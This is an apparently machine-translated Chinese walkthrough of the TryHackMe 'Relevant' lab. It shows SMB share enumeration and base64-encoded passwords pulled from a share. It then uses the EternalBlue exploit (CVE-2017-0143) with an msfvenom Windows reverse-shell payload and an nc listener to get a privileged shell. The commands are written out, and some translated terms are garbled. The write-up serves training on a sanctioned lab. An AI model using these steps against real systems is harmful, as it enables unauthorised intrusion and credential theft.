# TryHackMe —相关的 CTF 报道

> 原文：<https://infosecwriteups.com/tryhackme-relevant-ctf-write-up-7705501b73dd?source=collection_archive---------0----------------------->

![](img/4494acd1f6eaf3ca4abaf4d8bf638dc0.png)

相关是来自 TryHackMe 的中等挑战。有一些方法来完善这台机器，但在这篇文章中，我将解释如何使用与 samba 服务器相关的已知漏洞来完成。

首先，让我们从 Nmap 开始扫描所有端口。在这里，我们只需要运行:

```
nmap -oA nmap-full -Pn -sS -T4 -p- --defeat-rst-ratelimit 10.10.61.45
```

我已经设置了选项`-T4`和`--defeat-rst-ratelimit`来加快扫描速度，因为我在一个带 NAT 的虚拟机上运行 Kali，但这不是必须的。

正如你在下面看到的，这台机器有一堆开放的端口。有趣的是，我们注意到有一个 HTTP 服务器运行在端口 80 上，看起来像是一个 samba 服务器。还有一些其他更开放的端口，但是我不需要使用它们中的任何一个来获得 root，所以让我们跳过它们。

![](img/4f67a1610190b54793c7f84e7f0fdd59.png)

访问 web 服务器时，我们可以看到一个 Microsoft IIS 默认页面:

![](img/7cef06e2e158c92d8ba9d096b1aba7c1.png)

我已经尝试用 *gobuster* 枚举子目录，但什么也没找到，所以我们继续吧…

接下来，让我们看看我们能从 samba 服务器得到什么。使用 *smbclient* ，我们只需运行以下命令来尝试枚举共享，并将密码字段留空:

```
smbclient -L \\10.10.61.45\
```

![](img/2c742686d165e34306ebbabe003657a9.png)

很好，我们成功了！有一些默认共享，但 nt 4 works SV 可能隐藏了一些有趣的东西。我们可以尝试连接到这个共享，并通过运行以下命令来看看我们能得到什么:

```
smbclient \\10.10.61.45\nt4wrksv
```

如下图所示，有一个名为 *passwords.txt* 的文件:

![](img/caca377ae536ad56df5f2251a916adfd.png)

检查文件后，我们可以看到有两个 base64 编码的字符串:

![](img/74f2d47e5f88efe54753024690fe14c0.png)

通过解码这些字符串，我们似乎可以找到两个用户 Bill 和 Bob 的密码:

![](img/b9486a32658bd997698d6373c8edf491.png)

不错！我们得到了用户的凭证，但是现在呢？让我们再次使用 Nmap 来运行一些漏洞检查，这样我们就可以看到是否有任何易受攻击的服务器。我们可以使用`--script`参数来做到这一点:

```
nmap -oA nmap-vuln -Pn -script vuln -p 80,135,139,445,3389 10.10.61.45
```

![](img/e6bef1274597b13a17879714809ec6ff.png)

Nmap 检测到，由于 CVE-2017–0143，samba 服务器可能易受 RCE 攻击。快速搜索发现它与永恒之蓝漏洞有关:

![](img/9ac4f3174025e375e9dcdd3f102d5e0e.png)

因此，使用 *searchsploit* 我们可以获得永久蓝色漏洞:

![](img/42cdc7d4c1f8649b4a5e241e81c7ff38.png)

让我们使用第二个— windows/remote/42315.py:

```
searchsploit -m windows/remote/42315.py
```

![](img/603b98086ef71600c36d8c62ec037fbe.png)

为了运行这个漏洞，我们需要下载 *mysmb.py* 文件，正如脚本开头提到的。此外，我们可以为用户设置用户名和密码。

![](img/997d7764e7d2994d32ed11cae9f18c6e.png)

让我们使用之前获得的凭据。这里我使用 Bob 的凭证，因为 Bill 的无效:

![](img/a716f04319e0a49bad1955f59d0e8727.png)

通过阅读源代码，可以注意到`smb_pwn`函数创建了一个虚拟文件 pwned.txt 来测试漏洞。

![](img/2e32eae18caa139983e94d4b08b14c0d.png)

所以我们可以修改它来上传和执行一个反向 shell:

![](img/357c606d832c3fc6fae96cf142e217ac.png)

我们的 rshell.exe 可以用 *msfvenom* 获得。让我们通过运行以下命令来搜索 Windows 反向 shell 负载:

```
msfvenom -l payloads | grep windows | grep reverse | grep shell
```

![](img/5cf730e800ab8005fdd6c1ee761f3f2d.png)

选择*windows/shell _ reverse _ TCP*后，我们可以通过运行以下命令来查看参数:

```
msfvenom -p windows/shell_reverse_tcp --list-options
```

![](img/bfd8d1d6f246389493f94e5b3d7fa0c8.png)

我们需要用本地机器 IP 设置 LHOST 变量。我选择了 4444 本地端口值(l port ),但是您可以选择任何其他值。格式将是。因为它将在 windows 计算机上执行。所以完整的命令是:

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.13.6.126 LPORT=4444 -f exe > rshell.exe
```

![](img/ae79d55ee12408fc7488bf4a51a53e5a.png)

在运行脚本之前，我们需要启动本地服务器。使用 *netcat* ，只需输入:

```
nc -lnvp 4444
```

现在使用远程机器 IP 运行脚本，您将获得以下输出:

![](img/2ba7bc4313e8257c5c2a6a49a491933e.png)

尽管显示了一些错误，但总体任务执行成功，为我们提供了一个带有特权用户的 shell:

![](img/fbf3c8f72fa1cc427314e545e0be40ea.png)

现在我们需要搜索标志，一个好的起点是 Users 文件夹，它包含两个用户，Bob 和 Administrator:

![](img/d4025a1bf290033ebd9d0a614030ef00.png)

用户标志可以在 Bob 目录下的桌面文件夹中找到:

![](img/9377cf9c1451ab12eb2d34e8c996b75e.png)

根标志位于管理员目录下的桌面文件夹中:

![](img/528fb3c7cd54ae5c4108f2baf35af5c2.png)

# 参考

*   [红队区——永恒之蓝](https://redteamzone.com/EternalBlue/)